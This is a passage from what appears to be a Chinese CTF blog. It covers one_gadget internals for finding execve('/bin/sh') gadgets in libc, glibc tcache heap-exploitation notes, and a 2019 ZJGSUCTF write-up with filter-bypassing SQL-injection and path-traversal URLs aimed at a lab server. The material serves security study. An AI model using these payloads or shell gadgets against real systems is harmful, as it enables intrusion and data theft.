File.open(file) str = ELFTools::ELFFile.new(f).machine &#123; 'Advanced Micro Devices X86-64' =&gt; :amd64, 'Intel 80386' =&gt; :i386, 'ARM' =&gt; :arm, 'AArch64' =&gt; :aarch64, 'MIPS R3000' =&gt; :mips &#125;[str] || :unknownrescue ELFTools::ELFError # not a valid ELF :invalidensure f&amp;.closeend 接下来直接看看关键的函数lib/one_gadget/one_gadget.rb。这里面调用了找one_gadget的源文件fetcher.rb 123456789101112131415161718192021...require 'one_gadget/fetcher'... # The man entry of gem +one_gadget+. # If want to find gadgets from file, it will search gadgets by its # build id first.... def gadgets(file: nil, build_id: nil, details: false, force_file: false, level: 0) ret = if build_id OneGadget::Fetcher.from_build_id(build_id) || OneGadget::Logger.not_found(build_id) else from_file(OneGadget::Helper.abspath(file), force: force_file) end ret = refine_gadgets(ret, level) ret = ret.map(&amp;:offset) unless details ret rescue OneGadget::Error::Error =&gt; e OneGadget::Logger.error(\"#&#123;e.class.name.split('::').last&#125;: #&#123;e.message&#125;\") [] end... 可以看到注释里大概说了一下过程，这个函数就是one_gadget的“main”函数，会调用fetcher.rb中的函数，去builds文件夹里已经找到的one_gadget是否符合 接下来看lib/one_gadget/fetcher.rb，各个架构下的情况分别调用了各自对应的文件 1234567891011121314151617181920212223...require 'one_gadget/fetchers/aarch64'require 'one_gadget/fetchers/amd64'require 'one_gadget/fetchers/i386'require 'one_gadget/gadget'... def from_build_id(build_id, remote: true) OneGadget::Helper.verify_build_id!(build_id) OneGadget::Gadget.builds(build_id, remote: remote) end... def from_file(file) arch = OneGadget::Helper.architecture(file) klass = &#123; aarch64: OneGadget::Fetcher::AArch64, amd64: OneGadget::Fetcher::Amd64, i386: OneGadget::Fetcher::I386 &#125;[arch] raise Error::UnsupportedArchitectureError, arch if klass.nil? trim_gadgets(klass.new(file).find) end... 然后是lib/one_gadget/fetchers/base.rb，每种架构下获取one_gadget的方法都以这个函数为基础 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566... def resolve(processor) call = processor.registers[processor.pc].to_s # This costs cheaper, so check first. # check call execve / execl return unless %w[execve execl].any? &#123; |n| call.include?(n) &#125; # check first argument contains /bin/sh # since the logic is different between amd64 and i386, # invoke str_bin_sh? for checking return unless str_bin_sh?(processor.argument(0).to_s) if call.include?('execve') resolve_execve(processor) elsif call.include?('execl') resolve_execl(processor) end end def resolve_execve(processor) # arg[1] == NULL || [arg[1]] == NULL # arg[2] == NULL || [arg[2]] == NULL || arg[2] == envp arg1 = processor.argument(1).to_s arg2 = processor.argument(2).to_s cons = processor.constraints cons &lt;&lt; check_execve_arg(processor, arg1) return nil unless cons.all? envp = 'environ' return nil unless check_envp(processor, arg2) do |c| cons &lt;&lt; c envp = arg2 end &#123; constraints: cons, effect: %(execve(\"/bin/sh\", #&#123;arg1&#125;, #&#123;envp&#125;)) &#125; end # arg[1] == NULL || [arg[1]] == NULL def check_execve_arg(processor, arg) if arg.start_with?(processor.sp) # arg = sp+&lt;num&gt; # in this case, the only constraint is [sp+&lt;num&gt;] == NULL num = Integer(arg[processor.sp.size..-1]) slot = processor.stack[num].to_s return if global_var?(slot) \"#&#123;slot&#125; == NULL\" else \"[#&#123;arg&#125;] == NULL || #&#123;arg&#125; == NULL\" end end def check_envp(processor, arg) # if str starts with [[ and is global var, # believe it is environ # if starts with [[ but not global, drop it. return global_var?(arg) if arg.start_with?('[[') # normal cons = check_execve_arg(processor, arg) return nil if cons.nil? yield cons end... def str_bin_sh?(_str); raise NotImplementedError end... 可以看到先是找到字符串&quot;/bin/sh&quot;，然后检查是否call了execve，最后再检查另外两个参数的情况，最后就能得到one_gadget： 123456789101112λ one_gadget libc.so0x3c0cb execve(\"/bin/sh\", rsp+0x20, environ)constraints: [rsp+0x20] == NULL0xcb795 execve(\"/bin/sh\", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0xcb79a execve(\"/bin/sh\", rsi, environ)constraints: [rsi] == NULL || rsi == NULL spec这里放了一些常用 libc 的one_gadget tasks应该是一些编译的选项设置 Complement分析完之后再看看作者 david942j 的介绍 64 Bit这里首先以 64 位下的libc-2.23.so为例 12λ file /lib/x86_64-linux-gnu/libc-2.23.so/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/l, BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a, for GNU/Linux 2.6.32, stripped 先看看能够找到的one_gadget： 12345678910111213141516λ one_gadget /lib/x86_64-linux-gnu/libc-2.23.so0x45216 execve(\"/bin/sh\", rsp+0x30, environ)constraints: rax == NULL0x4526a execve(\"/bin/sh\", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 以第二个one_gadget为例，看一下这部分反汇编的代码： 123456789101112λ objdump -d /lib/x86_64-linux-gnu/libc-2.23.so... 4526a: 48 8b 05 47 ec 37 00 mov rax,QWORD PTR [rip+0x37ec47] # 3c3eb8 &lt;_IO_file_jumps@@GLIBC_2.2.5+0x7d8&gt; 45271: 48 8d 3d df 7a 14 00 lea rdi,[rip+0x147adf] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; 45278: 48 8d 74 24 30 lea rsi,[rsp+0x30] 4527d: c7 05 19 12 38 00 00 mov DWORD PTR [rip+0x381219],0x0 # 3c64a0 &lt;__abort_msg@@GLIBC_PRIVATE+0x8c0&gt; 45284: 00 00 00 45287: c7 05 13 12 38 00 00 mov DWORD PTR [rip+0x381213],0x0 # 3c64a4 &lt;__abort_msg@@GLIBC_PRIVATE+0x8c4&gt; 4528e: 00 00 00 45291: 48 8b 10 mov rdx,QWORD PTR [rax] 45294: e8 d7 74 08 00 call cc770 &lt;execve@@GLIBC_2.2.5&gt;... 第45271行的汇编等价于rdi = libc_base + 0x18cd57，可以看到libc_base + 0x18cd57就是字符串/bin/sh的位置： 12λ strings -tx /lib/x86_64-linux-gnu/libc-2.23.so | grep \"/bin/sh\" 18cd57 /bin/sh 再grep一下可以看到有很多类似的gadgets： 1234567891011121314151617λ objdump -d /lib/x86_64-linux-gnu/libc-2.23.so | grep \"18cd57\" 45271: 48 8d 3d df 7a 14 00 lea rdi,[rip+0x147adf] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; 6f5a6: 48 8d 3d aa d7 11 00 lea rdi,[rip+0x11d7aa] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cce31: 48 8d 05 1f ff 0b 00 lea rax,[rip+0xbff1f] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cd078: 48 8d 0d d8 fc 0b 00 lea rcx,[rip+0xbfcd8] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cd0f3: 48 8d 3d 5d fc 0b 00 lea rdi,[rip+0xbfc5d] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cd1c8: 48 8d 3d 88 fb 0b 00 lea rdi,[rip+0xbfb88] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f01b0: 48 8d 05 a0 cb 09 00 lea rax,[rip+0x9cba0] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f02b0: 48 8d 3d a0 ca 09 00 lea rdi,[rip+0x9caa0] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f02c4: 48 8d 05 8c ca 09 00 lea rax,[rip+0x9ca8c] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f0fcc: 48 8d 05 84 bd 09 00 lea rax,[rip+0x9bd84] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f10fc: 48 8d 05 54 bc 09 00 lea rax,[rip+0x9bc54] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f1153: 48 8d 3d fd bb 09 00 lea rdi,[rip+0x9bbfd] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f6276: 48 8d 3d da 6a 09 00 lea rdi,[rip+0x96ada] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f6643: 48 8d 05 0d 67 09 00 lea rax,[rip+0x9670d] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f66f0: 48 8d 3d 60 66 09 00 lea rdi,[rip+0x96660] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; ff8ae: 48 8d 05 a2 d4 08 00 lea rax,[rip+0x8d4a2] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; 再回到上面的汇编片段，第45278行等价于rsi = rsp + 0x30，那么基本可以判断出上面这一部分的gadget等价于execve(&quot;/bin/sh&quot;, rsp+0x30, environ);，可以成功 Get Shell 那么 64 位下one_gadget的实现原理就可以总结成三步： 找到有字符串&quot;/bin/sh&quot;的gadgets 筛选出附近有调用execve的gadgets 最后找出gadget中含有类似lea rsi,[rsp+0x??]的即为one_gadget 32Bit接下来看看 32 位下的libc-2.23.so，找one_gadget的方法就不太一样了： 12λ file /lib/i386-linux-gnu/libc-2.23.so/lib/i386-linux-gnu/libc-2.23.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=2052ef79d1bb69a8f5c5340eee984f2659b75e39, for GNU/Linux 2.6.32, stripped 可以找到很多gadgets： 123456789101112131415161718192021222324252627282930λ one_gadget /lib/i386-linux-gnu/libc-2.23.so0x3ac5c execve(\"/bin/sh\", esp+0x28, environ)constraints: esi is the GOT address of libc [esp+0x28] == NULL0x3ac5e execve(\"/bin/sh\", esp+0x2c, environ)constraints: esi is the GOT address of libc [esp+0x2c] == NULL0x3ac62 execve(\"/bin/sh\", esp+0x30, environ)constraints: esi is the GOT address of libc [esp+0x30] == NULL0x3ac69 execve(\"/bin/sh\", esp+0x34, environ)constraints: esi is the GOT address of libc [esp+0x34] == NULL0x5fbc5 execl(\"/bin/sh\", eax)constraints: esi is the GOT address of libc eax == NULL0x5fbc6 execl(\"/bin/sh\", [esp])constraints: esi is the GOT address of libc [esp] == NULL 这里以第四个one_gadget为例： 123456789101112131415λ objdump -d /lib/i386-linux-gnu/libc-2.23.so... 3ac69: 8b 86 48 ff ff ff mov eax,DWORD PTR [esi-0xb8] 3ac6f: 83 c4 0c add esp,0xc 3ac72: c7 86 20 16 00 00 00 mov DWORD PTR [esi+0x1620],0x0 3ac79: 00 00 00 3ac7c: c7 86 24 16 00 00 00 mov DWORD PTR [esi+0x1624],0x0 3ac83: 00 00 00 3ac86: ff 30 push DWORD PTR [eax] 3ac88: 8d 44 24 2c lea eax,[esp+0x2c] 3ac8c: 50 push eax 3ac8d: 8d 86 0b 9a fa ff lea eax,[esi-0x565f5] 3ac93: 50 push eax 3ac94: e8 47 5b 07 00 call b07e0 &lt;execve@@GLIBC_2.0&gt;... 32 位相较于 64 位有两个不同点： 32 位下通过[&lt;reg&gt;-0x??]（寄存器加立即数，即寄存器寻址方式）来访问只读数据 32 位下函数的传参通过栈来实现，而不是寄存器 最后 32 位下的one_gadget通过一个简单的符号执行实现，最后找到的one_gadget类似execve(&quot;/bin/sh&quot;, argv, environ);的形式。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"}]},{"title":"Tcache Makes Heap Exploitation Easy Again","slug":"Tcache-Makes-Heap-Exploitation-Easy-Again","date":"2019-05-15T06:07:46.000Z","updated":"2019-08-26T05:50:56.432Z","comments":true,"path":"2019/05/15/Tcache-Makes-Heap-Exploitation-Easy-Again/","link":"","permalink":"blog.b3ale.cn/2019/05/15/Tcache-Makes-Heap-Exploitation-Easy-Again/","excerpt":"校赛花了点时间临时学了一下tcache，整理一下基础知识。","text":"校赛花了点时间临时学了一下tcache，整理一下基础知识。 Intro全称是Thread Local Caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高 AnalysisStructure123456789101112131415161718/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; // TCACHE_MAX_BINS = 64 tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; tcache_perthread_struct是整个tcache的管理结构，总共有 64 个tcache_entry。tcache和fast bin有点像，都是单向链表结构，每个tcache_entry中有一个next指针，指向每一个大小相同的下一个chunk。counts记录每个tcache_entry中chunk的个数，一个tcache_entry上最多能有 7 个chunk。 Put tcachetcache中最重要的操作之一tcache_put： 1234567891011121314151617static __thread bool tcache_shutting_down = false;static __thread tcache_perthread_struct *tcache = NULL;/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; 把一个chunk放到指定的tcache_entry中。然后还会检测一下一个tcache_entry上的chunk个数是否超过规定的TCACHE_MAX_BINS。接下来把指定tcache_entry的key设成tcache，同时把指定tcache_entry的next指向对应的entries，再把对应的entries设成当前的tcache_entry。最后把counts的数目加一。 Get tcachetcache中最重要的操作之一tcache_get： 12345678910111213/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;counts[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; 基本上就是和tcache_put相反，把链表上的元素取下来的过程。中间还检测了一个tcache_entry上的chunk个数是否小于 0 或者大于TCACHE_MAX_BINS。 _int_malloc新增了tcache之后对malloc产生的变化 fast bin1234567891011121314151617181920212223242526272829303132333435/* ------------------------------ malloc ------------------------------ */static void *_int_malloc (mstate av, size_t bytes)&#123;...#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif...#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif... 在相应fast bin找到合适的chunk后，就把该chunk从fast bin里面拿下来 然后把相应fast bin里面剩下的chunk全都放到tcache里面，直到tcache-&gt;entries[tc_idx]满了 最后返回一开始拿到的chunk给用户 如果fast bin不能分配，则进入small bin的分配流程 small bin1234567891011121314151617181920212223242526...#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif... 和fast bin是类似的操作，在大小对应的small bin里面找到chunk 把chunk从链表上取下来 然后把该small bin 里面剩下的放入到tcache，直到tcache-&gt;entries[tc_idx]满 如果small bin也没能分配，进入unsorted bin unsorted bin12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849...#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif...#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif...#if USE_TCACHE &#125;#endif...#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif...#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif...&#125; 在遍历unsorted bin的时候，如果找到大小刚好满足的bin，不会立刻返回，而是把这个bin放入tcache里面，并且设置return_cached=1，表示有大小适配的unsorted bin进入了tcache 如果大小不是正好满足需要，就走一般的流程，把bin放到相应的small bin或者large bin里面 遍历unsorted bin的最后，会根据return_cached判断是否有大小适配的unsorted bin进入了tcache，mp_.tcache_unsorted_limit默认为 0，所以不会进入分支，这样就会把所有的unsorted bin都放入到tcache 遍历完unsorted bin后，根据return_cached判断tcache里面是否有合适的chunk，有的话就可以返回了 否则由large bin，top chunk来分配 _int_free新增了tcache之后对free产生的变化 12345678910111213141516171819202122232425262728293031323334353637383940/* ------------------------------ free ------------------------------ */static void_int_free (mstate av, mchunkptr p, int have_lock)&#123;...#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache)) &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr (\"free(): double free detected in tcache 2\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125; &#125;#endif...&#125; 首先就是获取要释放的chunk的大小，然后判断大小是否符和规范（或是否对齐等等)，如果合规就看tcache-&gt;counts[tc_idx]是否已经满了，如果没有满就直接放入tcache，然后返回 否则就和没有 tcache 是一样的处理 在free的时候，会检测下一个chunk的PREV_INUSE位，但是如果chunk被放入了tcache，next-&gt;PREV_INUSE位不会被修改，还是会标志为in_used，所以我们可以多次释放同一个chunk Referenceshttps://code.woboq.org/userspace/glibc/malloc/malloc.chttp://p4nda.top/2018/03/20/tcache/http://tukan.farm/2017/07/08/tcache/https://www.secpulse.com/archives/71958.htmlhttps://medium.com/@ktecv2000/tcache-exploitation-871044f8b210","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"2019-ZJGSUCTF","slug":"2019-ZJGSUCTF","date":"2019-05-12T15:45:39.000Z","updated":"2020-03-13T06:24:39.861Z","comments":true,"path":"2019/05/12/2019-ZJGSUCTF/","link":"","permalink":"blog.b3ale.cn/2019/05/12/2019-ZJGSUCTF/","excerpt":"一晃一年过去了，今年的个人赛肝的有点累。","text":"一晃一年过去了，今年的个人赛肝的有点累。 Web100 分的题目就不想名字了任意文件读取，../被过滤了，要双写绕过： 1http://10.21.13.190:22222/index.php?dir=.....///.....///.....///flag/flag1.txt 我苦心锻炼了三年sql 注入，过滤了and、or（双写绕过）以及空格（%a0）： 123456http://10.21.13.190:23579/youseesee.php?id=1%27%29anandd%271%27%3D%271%27%23http://10.21.13.190:23579/youseesee.php?id=1%27)%a0oorrder%a0by%a03%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,database()%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()anandd%a0table_name=&apos;N0_Ga3E_N0_1ife&apos;%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(0ne9unch3an)%a0from%a0N0_Ga3E_N0_1ife%23 ReClickVB 程序，要求点击十万次就能拿到 flag。VB 动态调起来基本都在 dll 里绕来绕去，直接用 ida。找到cmp edx, 186A0h的地方，用keypatch改成cmp edx, 10h，保存到文件之后，点十六下就能拿到 flag。 1234567891011121314.text:004139DF mov eax, 0Ah.text:004139E4 mov ecx, 80020004h.text:004139E9 mov [ebp+var_FF0], eax.text:004139EF mov [ebp+var_FE0], eax.text:004139F5 mov [ebp+var_FD0], eax.text:004139FB mov eax, [ebp+var_B4C].text:00413A01 mov [ebp+var_FE8], ecx.text:00413A07 mov [ebp+var_FD8], ecx.text:00413A0D mov [ebp+var_FC8], ecx.text:00413A13 lea edx, [ebp+var_1000].text:00413A19 lea ecx, [ebp+var_FC0].text:00413A1F mov [ebp+var_FF8], eax.text:00413A25 mov [ebp+var_1000], 8.text:00413A2F call ds:__vbaVarDup 或者在代码段可以看到mov eax, [ebp+var_B4C]，在那堆字符串里找到对应的 flag： 123.text:004121DD mov edx, offset aFlagIMJessicaB ; &quot;flag&#123;I&apos;m Jessica Banks&#125;&quot;.text:004121E2 lea ecx, [ebp+var_B4C].text:004121E8 call esi ; __vbaStrCopy 试了一下把每点一次的次数改大一点，发现不可能点出来。因为次数用的是有符号 int 存的，最大也就 32767，再大就变成负数-32767 了。 Message-Digestupx -d脱一下壳，gdb 调一下就大概知道是怎么回事了。直接爆破： 123456789#!/usr/bin/env pythonimport hashliblength = 6for i in range(100000, 1000000): res = hashlib.md5(str(i) + 're200').hexdigest().upper() print res if res == '6941162AC29D59EBC6C3737D296359B2': print i, 'Success!' break POKPOK网上整一个满级号存档，然后金手指直接跳到打五大天王，打通后找到 flag。 或者直接用Advance Map查看地图就能找到 flag。 COFFEEjadx反编译一下发现是在 native 层进行了加密。反编译一下资源里的.so文件。 看到 data 段给了一半被加密了的 flag，然后将输入的信息和前 16 位异或之后得到正确的 flag。 然后中间还有一个对输入的 check，正确的输入经过一个encrypt函数加密后得到的内容与 data 段中给出的另一段密文相等。加密函数如下： 1234567891011121314151617181920212223242526272829303132333435363738int __fastcall encrypt(const unsigned __int8 *key, unsigned __int8 *buf, int num_2)&#123; unsigned int v4; // [sp+Ch] [bp-3Ch] unsigned int v5; // [sp+10h] [bp-38h] unsigned int v6; // [sp+14h] [bp-34h] unsigned int v7; // [sp+18h] [bp-30h] unsigned int j; // [sp+20h] [bp-28h] unsigned int i; // [sp+24h] [bp-24h] int v10; // [sp+28h] [bp-20h] unsigned int v11; // [sp+2Ch] [bp-1Ch] unsigned int v12; // [sp+30h] [bp-18h] v7 = bswap32(*(_DWORD *)key); v6 = bswap32(*((_DWORD *)key + 1)); v5 = bswap32(*((_DWORD *)key + 2)); v4 = bswap32(*((_DWORD *)key + 3)); for ( i = 0; i &lt; num_2; ++i ) &#123; v10 = 0; v12 = bswap32(*(_DWORD *)&amp;buf[8 * i]); v11 = bswap32(*(_DWORD *)&amp;buf[8 * i + 4]); for ( j = 0; j &lt;= 0x1F; ++j ) &#123; v10 -= 0x61C88647; v12 += (v6 + (v11 &gt;&gt; 5)) ^ (v7 + 16 * v11) ^ (v10 + v11); v11 += (v4 + (v12 &gt;&gt; 5)) ^ (v5 + 16 * v12) ^ (v10 + v12); &#125; buf[8 * i] = HIBYTE(v12); buf[8 * i + 1] = BYTE2(v12); buf[8 * i + 2] = BYTE1(v12); buf[8 * i + 3] = v12; buf[8 * i + 4] = HIBYTE(v11); buf[8 * i + 5] = BYTE2(v11); buf[8 * i + 6] = BYTE1(v11); buf[8 * i + 7] = v11; &#125; return 0;&#125; 加密函数中，v10显然是个常数，每一轮的值是固定的，而v11和v12也只是被之前得到的数值进行了加减操作，显然是可逆的。最需要注意的就是大小端。Solve： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env pythonenc = [0x3C, 0x26, 0x26, 0x34, 0x2E, 0x0F, 0x31, 0x32, 0x6E, 0x20, 0x73, 0x2B, 0x34, 0x3C, 0x20, 0x4A, 0x20, 0x53, 0x4F, 0x4D, 0x45, 0x20, 0x54, 0x45, 0x41, 0x21, 0x7D]key = [0x00, 0x01, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x00]buf = [0xAB, 0x7D, 0x9A, 0xF9, 0x72, 0x86, 0x55, 0xF6, 0x8F, 0xBC, 0x39, 0x58, 0x28, 0x88, 0xD8, 0x09]flag = ''def pack(array): if len(array) != 4: print '[*] Length is not correct!' else: res = 0 for i in range(3, -1, -1): res += array[i] res = res * 0x100 return res / 0x100def unpack(dword): res = [] for i in range(4): t = dword &amp; 0xff dword &gt;&gt;= 8 res.append(t) res = res[::-1] return res#print hex(pack([0x12, 0x34, 0x56, 0x78]))#t = unpack(0x12345678)#print t#for x in t:# print hex(x)def decrypt(key, buf, num=2): print 'Decryption:' v7 = pack(key[0:4][::-1]) print hex(v7) v6 = pack(key[4:8][::-1]) print hex(v6) v5 = pack(key[8:12][::-1]) print hex(v5) v4 = pack(key[12:16][::-1]) print hex(v4) print 'encrypt:', for x in buf: print hex(x), print res = [] for i in range(2): v11 = pack(buf[8*(1-i)+4:8*(1-i)+8][::-1]) v12 = pack(buf[8*(1-i):8*(1-i)+4][::-1]) print 'v11:', hex(v11) print 'v12:', hex(v12) v10 = 0xc6ef3720 for j in range(0x20): v11 -= (v4 + (v12 &gt;&gt; 5)) ^ (v5 + 16 * v12) ^ (v10 + v12) v11 = v11 &amp; 0xFFFFFFFF v12 -= (v6 + (v11 &gt;&gt; 5)) ^ (v7 + 16 * v11) ^ (v10 + v11) v12 = v12 &amp; 0xFFFFFFFF v10 += 0x61C88647 v10 = v10 &amp; 0xFFFFFFFF# print 'Round', 0x20-j, 'v11:', hex(v11), 'v12:', hex(v12) print 'Origin v11:', hex(v11) res.extend(unpack(v11)[::-1]) print 'Origin v12:', hex(v12) res.extend(unpack(v12)[::-1]) res = res[::-1] print 'plain:', for x in res: print hex(x), print return resprint '----------HERE ARE THE RESULT----------'res = decrypt(key, buf)for i in range(16): flag += chr(enc[i] ^ res[i])for i in range(16, len(enc)): flag += chr(enc[i])print 'flag ==&gt;', flag 其实根据encrypt函数中v10减去的值可以判断出加密算法是 TEA，被魔改成了两轮加密。 MiscSign_in复制粘贴 flag。 Differ通过判断文件的 md5 值来 diff： 1234567891011121314151617#!/usr/bin/env pythonimport hashlibdiff = []flag = ''for i in range(100, 1000): name = str(i) + '.txt' f = open(name, 'rb') content = f.read() f.close() t = hashlib.md5(content).digest().encode('hex') if t in diff: print name, t, 'is in diff' diff.append(t) # dbfe6da0f40487d84dbc2b139f727a31 if t == 'dbfe6da0f40487d84dbc2b139f727a31': print name flag += str(i)print flag PACMAN反编译一下在MainLoop函数里找到 flag： 12345678910111213141516171819202122232425262728293031323334353637int MainLoop()&#123; signed int i; // [rsp+Ch] [rbp-4h] DrawWindow(); wrefresh(win); wrefresh(status); usleep(0xF4240u); do &#123; MovePacman(1000000LL); DrawWindow(); CheckCollision(); MoveGhosts(); DrawWindow(); CheckCollision(); if ( Points &gt; FreeLife ) &#123; ++Lives; FreeLife *= 2; &#125; Delay(); &#125; while ( Food &gt; 0 ); if ( Points &gt; 333 ) &#123; mytmp = 'f21&#123;USJZ'; qword_205EA8 = 'c5ec16fb'; qword_205EB0 = '&#125;c55fbc9'; byte_205EB8 = 0; for ( i = 5; i &lt;= 22; ++i ) --*((_BYTE *)&amp;mytmp + i); pat = (char *)&amp;mytmp; &#125; DrawWindow(); return usleep(0xF4240u);&#125; AlphaStop模仿棋，破解的方法： Solve： 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'p = remote('10.21.13.190', 2604)ins = ['J11', 'I11', 'I10', 'I9', 'J8', 'K8', 'L9', 'L10', 'L11', 'K12']for x in ins: p.sendline(x)for i in 